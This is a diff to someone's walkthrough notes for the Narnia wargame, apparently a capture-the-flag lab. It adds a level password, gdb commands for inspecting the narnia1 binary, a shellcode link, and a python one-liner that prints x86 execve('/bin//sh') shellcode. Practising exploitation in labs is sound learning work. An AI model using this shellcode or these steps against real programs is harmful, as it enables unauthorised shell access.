@@ -12,4 +12,20 @@ Level 0 :
 find -user narnia0 -type f
 cd /etc/narnia_pass
 Level 1 :
-Ppssword: efeidiedae
+Password: efeidiedae
+
+export EGG=cd
+
+
+gdb narnia1
+disassemble main
+
+break *0x080484b6           (Setting a breakpoint)
+
+ run            (run the code)
+
+ x/25x $eax
+
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+ python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"
